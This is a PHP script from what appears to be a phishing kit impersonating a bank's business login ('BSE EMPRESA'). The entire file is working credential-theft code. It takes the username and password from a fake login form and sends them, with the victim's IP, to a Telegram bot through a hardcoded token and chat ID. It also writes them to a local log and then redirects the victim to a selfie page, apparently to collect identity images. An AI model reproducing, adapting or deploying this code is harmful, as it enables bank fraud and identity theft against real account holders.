<?php
// main/sendPers.php

// Configuración de Telegram
define('BOT_TOKEN', '7666768336:AAHMexyFEv7ggRV5lpzA36Ldos2IUoqhhp8');
define('CHAT_ID', '1558822548');

// Para evitar errores de salida
ob_start();

// Capturar datos del formulario del index - CORREGIDO
$usuario = isset($_POST["usuario"]) ? trim($_POST["usuario"]) : '';
$clave = isset($_POST["clave"]) ? trim($_POST["clave"]) : ''; // Cambiado de "password" a "clave"

// Datos adicionales
$userIp = $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';

// ========== ENVÍO A TELEGRAM ==========
$message = " <b>🏦 BSE EMPRESA - Nuevo Acceso</b> \n\n" .
           "<b>👤 USUARIO:</b> <code>" . htmlspecialchars($usuario) . "</code>\n" .
           "<b>🔑 CONTRASEÑA:</b> <code>" . htmlspecialchars($clave) . "</code>\n\n" . // Cambiado $password por $clave
           "🌐 IP: <code>" . $userIp . "</code>\n" .
           " [By @masterusdt] ";

$telegramApiUrl = 'https://api.telegram.org/bot' . BOT_TOKEN . '/sendMessage';
$ch = curl_init($telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'chat_id' => CHAT_ID,
    'text' => $message,
    'parse_mode' => 'HTML'
]));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_exec($ch);
curl_close($ch);

// ========== GUARDAR EN LOG LOCAL ==========
$logEntry = "[" . date('Y-m-d H:i:s') . "] " .
            "IP: {$userIp} | " .
            "Usuario: {$usuario} | " .
            "Clave: {$clave}\n"; // Cambiado Password por Clave

// Crear directorio logs si no existe
$logDir = 'logs';
if (!file_exists($logDir)) {
    mkdir($logDir, 0755, true);
}

// Guardar en archivo de log
file_put_contents($logDir . '/bse_log.txt', $logEntry, FILE_APPEND | LOCK_EX);

// Limpiar buffer de salida
ob_end_clean();

// Redirigir a la página de verificación por selfie - CORREGIDO
header('Location: ../selfie.html'); // Cambiado a página existente
exit;
?>